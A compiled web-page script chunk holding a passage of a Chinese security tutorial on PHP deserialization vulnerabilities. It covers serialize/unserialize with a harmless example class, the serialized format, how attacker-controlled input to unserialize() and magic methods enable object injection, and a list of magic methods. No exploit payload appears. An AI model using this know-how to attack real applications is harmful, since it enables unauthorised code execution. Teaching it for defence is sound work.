import{_ as o,D as e,o as t,g as c,J as a,h as p,Q as l,m as s}from"./chunks/framework.f67d7268.js";const $=JSON.parse('{"title":"12反序列化漏洞：数据转换下的欺骗","description":"","frontmatter":{},"headers":[],"relativePath":"posts/devops/Web 安全攻防之道_文档/(5980) 12  反序列化漏洞：数据转换下的欺骗.md","filePath":"posts/devops/Web 安全攻防之道_文档/(5980) 12  反序列化漏洞：数据转换下的欺骗.md","lastUpdated":1696682708000}'),r={name:"posts/devops/Web 安全攻防之道_文档/(5980) 12  反序列化漏洞：数据转换下的欺骗.md"},y=l(`<h1 id="_12反序列化漏洞-数据转换下的欺骗" tabindex="-1">12反序列化漏洞：数据转换下的欺骗 <a class="header-anchor" href="#_12反序列化漏洞-数据转换下的欺骗" aria-label="Permalink to &quot;12反序列化漏洞：数据转换下的欺骗&quot;">​</a></h1><p>上一讲介绍了 XXE 漏洞，它在业务场景中很容易用于读取敏感文件、进行代码执行，甚至也会用来渗透内网，也因此 XXE 漏洞常被当作一种严重漏洞来对待。</p><p>本讲我将介绍另一种常用来实现远程代码执行的漏洞类型------<strong>反序列化漏洞</strong>，这几年经常出现在 Java 公共库，比如阿里的 fastjson，还有一些 Java 应用服务器，比如 JBoss。PHP 也有反序列化，比如著名的 Joomla 内容管理系统很多编程语言都有这种反序列化功能，若对反序列化的数据未做有效过滤和限制，就可能导致这种漏洞的产生。</p><p>下面我就详细给你介绍下关于反序列化漏洞攻防的方方面面，演示案例我依然会以 PHP 为例，方便大家学习。</p><h3 id="序列化与反序列化" tabindex="-1">序列化与反序列化 <a class="header-anchor" href="#序列化与反序列化" aria-label="Permalink to &quot;序列化与反序列化&quot;">​</a></h3><p>为什么会有序列化与反序列化的需求呢？</p><p>序列化是把对象转换成有序字节流，通常都是一段可阅读的字符串，以便在网络上传输或者保存在本地文件中。同样，如果我们想直接使用某对象时，就可能通过反序列化前面保存的字符串，快速地重建对象，也不用重写一遍代码，提高工作效率。</p><p>以 PHP 语言为例，下面以代码示例介绍下序列化与反序列化，帮助你更直观地理解两者的概念。</p><h4 id="_1-序列化示例" tabindex="-1">1.序列化示例 <a class="header-anchor" href="#_1-序列化示例" aria-label="Permalink to &quot;1.序列化示例&quot;">​</a></h4><p>PHP 中通过 serialize 函数进行序列化操作，先定义个类，然后用它创建个类对象再序列化，代码示例如下：</p><div class="language-php vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">php</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#F97583;">&lt;?</span><span style="color:#79B8FF;">php</span></span>
<span class="line"><span style="color:#E1E4E8;">  </span><span style="color:#F97583;">class</span><span style="color:#E1E4E8;"> </span><span style="color:#B392F0;">People</span><span style="color:#E1E4E8;">{</span></span>
<span class="line"><span style="color:#E1E4E8;">      </span><span style="color:#F97583;">public</span><span style="color:#E1E4E8;"> $id </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">1</span><span style="color:#E1E4E8;">;</span></span>
<span class="line"><span style="color:#E1E4E8;">      </span><span style="color:#F97583;">protected</span><span style="color:#E1E4E8;"> $name </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">&quot;john&quot;</span><span style="color:#E1E4E8;">;</span></span>
<span class="line"><span style="color:#E1E4E8;">      </span><span style="color:#F97583;">private</span><span style="color:#E1E4E8;"> $age </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">18</span><span style="color:#E1E4E8;">;</span></span>
<span class="line"><span style="color:#E1E4E8;">  }</span></span>
<span class="line"></span>
<span class="line"><span style="color:#E1E4E8;">  $obj </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">new</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">People</span><span style="color:#E1E4E8;">();</span></span>
<span class="line"><span style="color:#E1E4E8;">  </span><span style="color:#79B8FF;">echo</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">serialize</span><span style="color:#E1E4E8;">($obj);</span></span>
<span class="line"><span style="color:#F97583;">?&gt;</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#D73A49;">&lt;?</span><span style="color:#005CC5;">php</span></span>
<span class="line"><span style="color:#24292E;">  </span><span style="color:#D73A49;">class</span><span style="color:#24292E;"> </span><span style="color:#6F42C1;">People</span><span style="color:#24292E;">{</span></span>
<span class="line"><span style="color:#24292E;">      </span><span style="color:#D73A49;">public</span><span style="color:#24292E;"> $id </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">1</span><span style="color:#24292E;">;</span></span>
<span class="line"><span style="color:#24292E;">      </span><span style="color:#D73A49;">protected</span><span style="color:#24292E;"> $name </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> </span><span style="color:#032F62;">&quot;john&quot;</span><span style="color:#24292E;">;</span></span>
<span class="line"><span style="color:#24292E;">      </span><span style="color:#D73A49;">private</span><span style="color:#24292E;"> $age </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">18</span><span style="color:#24292E;">;</span></span>
<span class="line"><span style="color:#24292E;">  }</span></span>
<span class="line"></span>
<span class="line"><span style="color:#24292E;">  $obj </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">new</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">People</span><span style="color:#24292E;">();</span></span>
<span class="line"><span style="color:#24292E;">  </span><span style="color:#005CC5;">echo</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">serialize</span><span style="color:#24292E;">($obj);</span></span>
<span class="line"><span style="color:#D73A49;">?&gt;</span></span></code></pre></div><p>我在 PHP 7.4.3 版本下执行，它会输出以下这段字符串：</p><div class="language-shell vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">shell</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#B392F0;">$</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">php</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">-v</span></span>
<span class="line"><span style="color:#B392F0;">PHP</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">7.4</span><span style="color:#9ECBFF;">.3</span><span style="color:#E1E4E8;"> (cli) (</span><span style="color:#B392F0;">built:</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">Oct</span><span style="color:#E1E4E8;">  </span><span style="color:#79B8FF;">6</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">2020</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">15</span><span style="color:#9ECBFF;">:47:56</span><span style="color:#E1E4E8;">) ( </span><span style="color:#B392F0;">NTS</span><span style="color:#E1E4E8;"> )</span></span>
<span class="line"><span style="color:#B392F0;">Copyright</span><span style="color:#E1E4E8;"> (c) The PHP Group</span></span>
<span class="line"><span style="color:#B392F0;">Zend</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">Engine</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">v3.4.0,</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">Copyright</span><span style="color:#E1E4E8;"> (c) Zend Technologies</span></span>
<span class="line"><span style="color:#E1E4E8;">    </span><span style="color:#B392F0;">with</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">Zend</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">OPcache</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">v7.4.3,</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">Copyright</span><span style="color:#E1E4E8;"> (c), by Zend Technologies</span></span>
<span class="line"><span style="color:#B392F0;">$</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">php</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">test.php</span><span style="color:#E1E4E8;"> </span></span>
<span class="line"><span style="color:#B392F0;">&#39;O:6:&quot;People&quot;:3:{s:2:&quot;id&quot;;i:1;s:7:&quot; * name&quot;;s:4:&quot;john&quot;;s:11:&quot; People age&quot;;i:18;}&#39;</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#6F42C1;">$</span><span style="color:#24292E;"> </span><span style="color:#032F62;">php</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">-v</span></span>
<span class="line"><span style="color:#6F42C1;">PHP</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">7.4</span><span style="color:#032F62;">.3</span><span style="color:#24292E;"> (cli) (</span><span style="color:#6F42C1;">built:</span><span style="color:#24292E;"> </span><span style="color:#032F62;">Oct</span><span style="color:#24292E;">  </span><span style="color:#005CC5;">6</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">2020</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">15</span><span style="color:#032F62;">:47:56</span><span style="color:#24292E;">) ( </span><span style="color:#6F42C1;">NTS</span><span style="color:#24292E;"> )</span></span>
<span class="line"><span style="color:#6F42C1;">Copyright</span><span style="color:#24292E;"> (c) The PHP Group</span></span>
<span class="line"><span style="color:#6F42C1;">Zend</span><span style="color:#24292E;"> </span><span style="color:#032F62;">Engine</span><span style="color:#24292E;"> </span><span style="color:#032F62;">v3.4.0,</span><span style="color:#24292E;"> </span><span style="color:#032F62;">Copyright</span><span style="color:#24292E;"> (c) Zend Technologies</span></span>
<span class="line"><span style="color:#24292E;">    </span><span style="color:#6F42C1;">with</span><span style="color:#24292E;"> </span><span style="color:#032F62;">Zend</span><span style="color:#24292E;"> </span><span style="color:#032F62;">OPcache</span><span style="color:#24292E;"> </span><span style="color:#032F62;">v7.4.3,</span><span style="color:#24292E;"> </span><span style="color:#032F62;">Copyright</span><span style="color:#24292E;"> (c), by Zend Technologies</span></span>
<span class="line"><span style="color:#6F42C1;">$</span><span style="color:#24292E;"> </span><span style="color:#032F62;">php</span><span style="color:#24292E;"> </span><span style="color:#032F62;">test.php</span><span style="color:#24292E;"> </span></span>
<span class="line"><span style="color:#6F42C1;">&#39;O:6:&quot;People&quot;:3:{s:2:&quot;id&quot;;i:1;s:7:&quot; * name&quot;;s:4:&quot;john&quot;;s:11:&quot; People age&quot;;i:18;}&#39;</span></span></code></pre></div><p>注意：有些终端在输出时，可能会把其中的 \\x00 过滤掉，&quot;Peopleage&quot; 其实是 &quot;\\x00People\\x00age&quot; 这样的数据，在后面进行反序列化操作时要注意，可拿前面的变量名长度进行对比。</p><p>对生成后序列化字符串前半部分做个解释，后面类似：</p><div class="language-java vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">java</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#E1E4E8;">O：代表对象Object</span></span>
<span class="line"><span style="color:#79B8FF;">6</span><span style="color:#E1E4E8;">：对象名称长度</span></span>
<span class="line"><span style="color:#E1E4E8;">People：对象名称</span></span>
<span class="line"><span style="color:#79B8FF;">3</span><span style="color:#E1E4E8;">：变量个数</span></span>
<span class="line"><span style="color:#E1E4E8;">s：数据类型</span></span>
<span class="line"><span style="color:#79B8FF;">2</span><span style="color:#E1E4E8;">：变量名长度</span></span>
<span class="line"><span style="color:#E1E4E8;">id：变量名</span></span>
<span class="line"><span style="color:#E1E4E8;">i：整数类型</span></span>
<span class="line"><span style="color:#79B8FF;">1</span><span style="color:#E1E4E8;">：变量值</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#24292E;">O：代表对象Object</span></span>
<span class="line"><span style="color:#005CC5;">6</span><span style="color:#24292E;">：对象名称长度</span></span>
<span class="line"><span style="color:#24292E;">People：对象名称</span></span>
<span class="line"><span style="color:#005CC5;">3</span><span style="color:#24292E;">：变量个数</span></span>
<span class="line"><span style="color:#24292E;">s：数据类型</span></span>
<span class="line"><span style="color:#005CC5;">2</span><span style="color:#24292E;">：变量名长度</span></span>
<span class="line"><span style="color:#24292E;">id：变量名</span></span>
<span class="line"><span style="color:#24292E;">i：整数类型</span></span>
<span class="line"><span style="color:#005CC5;">1</span><span style="color:#24292E;">：变量值</span></span></code></pre></div><p>序列化后有很多数据类型的表示，你先提前了解一下，以后写反序列化利用时有可能会用到。</p><div class="language-java vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">java</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#E1E4E8;">a </span><span style="color:#F97583;">-</span><span style="color:#E1E4E8;"> array 数组型</span></span>
<span class="line"><span style="color:#E1E4E8;">b </span><span style="color:#F97583;">-</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">boolean</span><span style="color:#E1E4E8;"> 布尔型</span></span>
<span class="line"><span style="color:#E1E4E8;">d </span><span style="color:#F97583;">-</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">double</span><span style="color:#E1E4E8;"> 浮点型</span></span>
<span class="line"><span style="color:#E1E4E8;">i </span><span style="color:#F97583;">-</span><span style="color:#E1E4E8;"> integer 整数型</span></span>
<span class="line"><span style="color:#E1E4E8;">o </span><span style="color:#F97583;">-</span><span style="color:#E1E4E8;"> common object 共同对象</span></span>
<span class="line"><span style="color:#E1E4E8;">r </span><span style="color:#F97583;">-</span><span style="color:#E1E4E8;"> objec reference 对象引用</span></span>
<span class="line"><span style="color:#E1E4E8;">s </span><span style="color:#F97583;">-</span><span style="color:#E1E4E8;"> non</span><span style="color:#F97583;">-</span><span style="color:#E1E4E8;">escaped binary string 非转义的二进制字符串</span></span>
<span class="line"><span style="color:#E1E4E8;">S </span><span style="color:#F97583;">-</span><span style="color:#E1E4E8;"> escaped binary string 转义的二进制字符串</span></span>
<span class="line"><span style="color:#E1E4E8;">C </span><span style="color:#F97583;">-</span><span style="color:#E1E4E8;"> custom object 自定义对象</span></span>
<span class="line"><span style="color:#E1E4E8;">O - </span><span style="color:#F97583;">class</span><span style="color:#E1E4E8;"> </span><span style="color:#B392F0;">对象</span></span>
<span class="line"><span style="color:#E1E4E8;">N - null 空</span></span>
<span class="line"><span style="color:#E1E4E8;">R - pointer reference 指针引用</span></span>
<span class="line"><span style="color:#E1E4E8;">U - unicode string Unicode 编码的字符串</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#24292E;">a </span><span style="color:#D73A49;">-</span><span style="color:#24292E;"> array 数组型</span></span>
<span class="line"><span style="color:#24292E;">b </span><span style="color:#D73A49;">-</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">boolean</span><span style="color:#24292E;"> 布尔型</span></span>
<span class="line"><span style="color:#24292E;">d </span><span style="color:#D73A49;">-</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">double</span><span style="color:#24292E;"> 浮点型</span></span>
<span class="line"><span style="color:#24292E;">i </span><span style="color:#D73A49;">-</span><span style="color:#24292E;"> integer 整数型</span></span>
<span class="line"><span style="color:#24292E;">o </span><span style="color:#D73A49;">-</span><span style="color:#24292E;"> common object 共同对象</span></span>
<span class="line"><span style="color:#24292E;">r </span><span style="color:#D73A49;">-</span><span style="color:#24292E;"> objec reference 对象引用</span></span>
<span class="line"><span style="color:#24292E;">s </span><span style="color:#D73A49;">-</span><span style="color:#24292E;"> non</span><span style="color:#D73A49;">-</span><span style="color:#24292E;">escaped binary string 非转义的二进制字符串</span></span>
<span class="line"><span style="color:#24292E;">S </span><span style="color:#D73A49;">-</span><span style="color:#24292E;"> escaped binary string 转义的二进制字符串</span></span>
<span class="line"><span style="color:#24292E;">C </span><span style="color:#D73A49;">-</span><span style="color:#24292E;"> custom object 自定义对象</span></span>
<span class="line"><span style="color:#24292E;">O - </span><span style="color:#D73A49;">class</span><span style="color:#24292E;"> </span><span style="color:#6F42C1;">对象</span></span>
<span class="line"><span style="color:#24292E;">N - null 空</span></span>
<span class="line"><span style="color:#24292E;">R - pointer reference 指针引用</span></span>
<span class="line"><span style="color:#24292E;">U - unicode string Unicode 编码的字符串</span></span></code></pre></div><p>相信到这里，你对所谓的序列化操作有了直观的认识感受，它就是将对象转换成可阅读可存储的字符串序列。</p><h4 id="_2-反序列化示例" tabindex="-1">2.反序列化示例 <a class="header-anchor" href="#_2-反序列化示例" aria-label="Permalink to &quot;2.反序列化示例&quot;">​</a></h4><p>反序列化就是对前面的序列化的反向操作，即将字符串序列重建回对象。</p><p>现在我们将前面生成的序列化字符串进行反序列化操作，通过 unserialize() 函数来实现：</p><div class="language-php vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">php</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#F97583;">&lt;?</span><span style="color:#79B8FF;">php</span></span>
<span class="line"><span style="color:#E1E4E8;">  $str </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">&#39;O:6:&quot;People&quot;:3:{s:2:&quot;id&quot;;i:1;s:7:&quot; * name&quot;;s:4:&quot;john&quot;;s:11:&quot; People age&quot;;i:18;}&#39;</span><span style="color:#E1E4E8;">;</span></span>
<span class="line"><span style="color:#E1E4E8;">  $u </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">unserialize</span><span style="color:#E1E4E8;">($str);</span></span>
<span class="line"><span style="color:#E1E4E8;">  </span><span style="color:#79B8FF;">echo</span><span style="color:#E1E4E8;"> $u</span><span style="color:#F97583;">-&gt;</span><span style="color:#E1E4E8;">id;</span></span>
<span class="line"><span style="color:#F97583;">?&gt;</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#D73A49;">&lt;?</span><span style="color:#005CC5;">php</span></span>
<span class="line"><span style="color:#24292E;">  $str </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> </span><span style="color:#032F62;">&#39;O:6:&quot;People&quot;:3:{s:2:&quot;id&quot;;i:1;s:7:&quot; * name&quot;;s:4:&quot;john&quot;;s:11:&quot; People age&quot;;i:18;}&#39;</span><span style="color:#24292E;">;</span></span>
<span class="line"><span style="color:#24292E;">  $u </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">unserialize</span><span style="color:#24292E;">($str);</span></span>
<span class="line"><span style="color:#24292E;">  </span><span style="color:#005CC5;">echo</span><span style="color:#24292E;"> $u</span><span style="color:#D73A49;">-&gt;</span><span style="color:#24292E;">id;</span></span>
<span class="line"><span style="color:#D73A49;">?&gt;</span></span></code></pre></div><p>执行之后，成功获取到 People 的属性 id 值，说明反序列化重建出来的对象是可用的：</p><div class="language-java vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">java</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#E1E4E8;">$ php test.php</span></span>
<span class="line"><span style="color:#79B8FF;">1</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#24292E;">$ php test.php</span></span>
<span class="line"><span style="color:#005CC5;">1</span></span></code></pre></div><p>如果你访问 $name 与 $age 就会出错，因为它们不是公有属性，不可直接访问：</p><div class="language-java vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">java</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#E1E4E8;">PHP Fatal error</span><span style="color:#F97583;">:</span><span style="color:#E1E4E8;">  Uncaught Error</span><span style="color:#F97583;">:</span><span style="color:#E1E4E8;"> Cannot access </span><span style="color:#F97583;">private</span><span style="color:#E1E4E8;"> property People</span><span style="color:#F97583;">::</span><span style="color:#E1E4E8;">$age in </span><span style="color:#F97583;">/</span><span style="color:#E1E4E8;">tmp</span><span style="color:#F97583;">/</span><span style="color:#E1E4E8;">test.php</span><span style="color:#F97583;">:</span><span style="color:#79B8FF;">14</span></span>
<span class="line"><span style="color:#E1E4E8;">Stack trace</span><span style="color:#F97583;">:</span></span>
<span class="line"><span style="color:#E1E4E8;">#</span><span style="color:#79B8FF;">0</span><span style="color:#E1E4E8;"> {main}</span></span>
<span class="line"><span style="color:#E1E4E8;">  thrown in </span><span style="color:#F97583;">/</span><span style="color:#E1E4E8;">tmp</span><span style="color:#F97583;">/</span><span style="color:#E1E4E8;">test.php on line </span><span style="color:#79B8FF;">14</span></span>
<span class="line"><span style="color:#E1E4E8;">PHP Fatal error</span><span style="color:#F97583;">:</span><span style="color:#E1E4E8;">  Uncaught Error</span><span style="color:#F97583;">:</span><span style="color:#E1E4E8;"> Cannot access </span><span style="color:#F97583;">protected</span><span style="color:#E1E4E8;"> property People</span><span style="color:#F97583;">::</span><span style="color:#E1E4E8;">$name in </span><span style="color:#F97583;">/</span><span style="color:#E1E4E8;">tmp</span><span style="color:#F97583;">/</span><span style="color:#E1E4E8;">test.php</span><span style="color:#F97583;">:</span><span style="color:#79B8FF;">14</span></span>
<span class="line"><span style="color:#E1E4E8;">Stack trace</span><span style="color:#F97583;">:</span></span>
<span class="line"><span style="color:#E1E4E8;">#</span><span style="color:#79B8FF;">0</span><span style="color:#E1E4E8;"> {main}</span></span>
<span class="line"><span style="color:#E1E4E8;">  thrown in </span><span style="color:#F97583;">/</span><span style="color:#E1E4E8;">tmp</span><span style="color:#F97583;">/</span><span style="color:#E1E4E8;">test.php on line </span><span style="color:#79B8FF;">14</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#24292E;">PHP Fatal error</span><span style="color:#D73A49;">:</span><span style="color:#24292E;">  Uncaught Error</span><span style="color:#D73A49;">:</span><span style="color:#24292E;"> Cannot access </span><span style="color:#D73A49;">private</span><span style="color:#24292E;"> property People</span><span style="color:#D73A49;">::</span><span style="color:#24292E;">$age in </span><span style="color:#D73A49;">/</span><span style="color:#24292E;">tmp</span><span style="color:#D73A49;">/</span><span style="color:#24292E;">test.php</span><span style="color:#D73A49;">:</span><span style="color:#005CC5;">14</span></span>
<span class="line"><span style="color:#24292E;">Stack trace</span><span style="color:#D73A49;">:</span></span>
<span class="line"><span style="color:#24292E;">#</span><span style="color:#005CC5;">0</span><span style="color:#24292E;"> {main}</span></span>
<span class="line"><span style="color:#24292E;">  thrown in </span><span style="color:#D73A49;">/</span><span style="color:#24292E;">tmp</span><span style="color:#D73A49;">/</span><span style="color:#24292E;">test.php on line </span><span style="color:#005CC5;">14</span></span>
<span class="line"><span style="color:#24292E;">PHP Fatal error</span><span style="color:#D73A49;">:</span><span style="color:#24292E;">  Uncaught Error</span><span style="color:#D73A49;">:</span><span style="color:#24292E;"> Cannot access </span><span style="color:#D73A49;">protected</span><span style="color:#24292E;"> property People</span><span style="color:#D73A49;">::</span><span style="color:#24292E;">$name in </span><span style="color:#D73A49;">/</span><span style="color:#24292E;">tmp</span><span style="color:#D73A49;">/</span><span style="color:#24292E;">test.php</span><span style="color:#D73A49;">:</span><span style="color:#005CC5;">14</span></span>
<span class="line"><span style="color:#24292E;">Stack trace</span><span style="color:#D73A49;">:</span></span>
<span class="line"><span style="color:#24292E;">#</span><span style="color:#005CC5;">0</span><span style="color:#24292E;"> {main}</span></span>
<span class="line"><span style="color:#24292E;">  thrown in </span><span style="color:#D73A49;">/</span><span style="color:#24292E;">tmp</span><span style="color:#D73A49;">/</span><span style="color:#24292E;">test.php on line </span><span style="color:#005CC5;">14</span></span></code></pre></div><p>这里主要介绍的是 PHP 的序列化与反序列化，很多语言也都有这种功能，我在后面的&quot;扩展：其他语言的反序列化&quot;小节中做了补充，你可以继续去探索下其他语言。</p><h3 id="漏洞是如何产生的" tabindex="-1">漏洞是如何产生的？ <a class="header-anchor" href="#漏洞是如何产生的" aria-label="Permalink to &quot;漏洞是如何产生的？&quot;">​</a></h3><p>反序列化原本只是一个正常的功能，那为什么反序列化就会产生漏洞呢？</p><p>当传给 unserialize() 的参数由外部可控时，若攻击者通过传入一个精心构造的序列化字符串，从而控制对象内部的变量甚至是函数，比如 PHP 中特殊的<strong>魔术方法</strong>（详见下文），这些方法在某些情况下会被自动调用，为实现任意代码执行提供了条件，这时反序列化漏洞就产生了，PHP 反序列化漏洞有时也被称为&quot;PHP 对象注入&quot;漏洞。</p><h3 id="攻击反序列化漏洞" tabindex="-1">攻击反序列化漏洞 <a class="header-anchor" href="#攻击反序列化漏洞" aria-label="Permalink to &quot;攻击反序列化漏洞&quot;">​</a></h3><p>反序列化参数可控后，如果我们只能针对参数的类对象进行利用，那么攻击面就太小了。这时利用<strong>魔术方法</strong>就可以扩大攻击面，它在该类的序列化或反序列化中就可能自动完成调用，对于漏洞的利用可以直到关键作用。</p><p>除此之外，还有后面将介绍到的 POP 链构造等手法都可以进一步扩大攻击面，达到代码执行的效果。</p><h4 id="_1-利用魔术方法" tabindex="-1">1.利用魔术方法 <a class="header-anchor" href="#_1-利用魔术方法" aria-label="Permalink to &quot;1.利用魔术方法&quot;">​</a></h4><p>魔术方法就是 PHP 中一些在某些情况下会被自动调用的方法，无须手工调用，比如当一个对象创建时 __construct 会被调用，当一个对象销毁时 __destruct 会被调用。</p><p>下面是 PHP 中一些常用的魔术方法：</p><div class="language-php vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">php</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#B392F0;">__construct</span><span style="color:#E1E4E8;">()   </span><span style="color:#6A737D;">#类的构造函数</span></span>
<span class="line"><span style="color:#B392F0;">__destruct</span><span style="color:#E1E4E8;">()    </span><span style="color:#6A737D;">#类的析构函数</span></span>
<span class="line"><span style="color:#B392F0;">__call</span><span style="color:#E1E4E8;">()        </span><span style="color:#6A737D;">#在对象中调用一个不可访问方法时调用</span></span>
<span class="line"><span style="color:#B392F0;">__callStatic</span><span style="color:#E1E4E8;">()  </span><span style="color:#6A737D;">#用静态方式中调用一个不可访问方法时调用</span></span>
<span class="line"><span style="color:#B392F0;">__get</span><span style="color:#E1E4E8;">()    </span><span style="color:#6A737D;">#获得一个类的成员变量时调用</span></span>
<span class="line"><span style="color:#B392F0;">__set</span><span style="color:#E1E4E8;">()    </span><span style="color:#6A737D;">#设置一个类的成员变量时调用</span></span>
<span class="line"><span style="color:#B392F0;">__isset</span><span style="color:#E1E4E8;">()  </span><span style="color:#6A737D;">#当对不可访问属性调用isset()或empty()时调用</span></span>
<span class="line"><span style="color:#B392F0;">__unset</span><span style="color:#E1E4E8;">()  </span><span style="color:#6A737D;">#当对不可访问属性调用unset()时被调用。</span></span>
<span class="line"><span style="color:#B392F0;">__sleep</span><span style="color:#E1E4E8;">()  </span><span style="color:#6A737D;">#执行serialize()时，先会调用这个函数</span></span>
<span class="line"><span style="color:#B392F0;">__wakeup</span><span style="color:#E1E4E8;">() </span><span style="color:#6A737D;">#执行unserialize()时，先会调用这个函数</span></span>
<span class="line"><span style="color:#B392F0;">__toString</span><span style="color:#E1E4E8;">()   </span><span style="color:#6A737D;">#类被当成字符串时的回应方法</span></span>
<span class="line"><span style="color:#B392F0;">__invoke</span><span style="color:#E1E4E8;">()     </span><span style="color:#6A737D;">#调用函数的方式调用一个对象时的回应方法</span></span>
<span class="line"><span style="color:#B392F0;">__set_state</span><span style="color:#E1E4E8;">()  </span><span style="color:#6A737D;">#调用var_export()导出类时，此静态方法会被调用。</span></span>
<span class="line"><span style="color:#B392F0;">__clone</span><span style="color:#E1E4E8;">()      </span><span style="color:#6A737D;">#当对象复制完成时调用</span></span>
<span class="line"><span style="color:#79B8FF;">__autoload</span><span style="color:#E1E4E8;">()   </span><span style="color:#6A737D;">#尝试加载未定义的类</span></span>
<span class="line"><span style="color:#B392F0;">__debugInfo</span><span style="color:#E1E4E8;">()  </span><span style="color:#6A737D;">#打印所需调试信息</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#6F42C1;">__construct</span><span style="color:#24292E;">()   </span><span style="color:#6A737D;">#类的构造函数</span></span>
<span class="line"><span style="color:#6F42C1;">__destruct</span><span style="color:#24292E;">()    </span><span style="color:#6A737D;">#类的析构函数</span></span>
<span class="line"><span style="color:#6F42C1;">__call</span><span style="color:#24292E;">()        </span><span style="color:#6A737D;">#在对象中调用一个不可访问方法时调用</span></span>
<span class="line"><span style="color:#6F42C1;">__callStatic</span><span style="color:#24292E;">()  </span><span style="color:#6A737D;">#用静态方式中调用一个不可访问方法时调用</span></span>
<span class="line"><span style="color:#6F42C1;">__get</span><span style="color:#24292E;">()    </span><span style="color:#6A737D;">#获得一个类的成员变量时调用</span></span>
<span class="line"><span style="color:#6F42C1;">__set</span><span style="color:#24292E;">()    </span><span style="color:#6A737D;">#设置一个类的成员变量时调用</span></span>
<span class="line"><span style="color:#6F42C1;">__isset</span><span style="color:#24292E;">()  </span><span style="color:#6A737D;">#当对不可访问属性调用isset()或empty()时调用</span></span>
<span class="line"><span style="color:#6F42C1;">__unset</span><span style="color:#24292E;">()  </span><span style="color:#6A737D;">#当对不可访问属性调用unset()时被调用。</span></span>
<span class="line"><span style="color:#6F42C1;">__sleep</span><span style="color:#24292E;">()  </span><span style="color:#6A737D;">#执行serialize()时，先会调用这个函数</span></span>
<span class="line"><span style="color:#6F42C1;">__wakeup</span><span style="color:#24292E;">() </span><span style="color:#6A737D;">#执行unserialize()时，先会调用这个函数</span></span>
<span class="line"><span style="color:#6F42C1;">__toString</span><span style="color:#24292E;">()   </span><span style="color:#6A737D;">#类被当成字符串时的回应方法</span></span>
<span class="line"><span style="color:#6F42C1;">__invoke</span><span style="color:#24292E;">()     </span><span style="color:#6A737D;">#调用函数的方式调用一个对象时的回应方法</span></span>
<span class="line"><span style="color:#6F42C1;">__set_state</span><span style="color:#24292E;">()  </span><span style="color:#6A737D;">#调用var_export()导出类时，此静态方法会被调用。</span></span>
<span class="line"><span style="color:#6F42C1;">__clone</span><span style="color:#24292E;">()      </span><span style="color:#6A737D;">#当对象复制完成时调用</span></span>
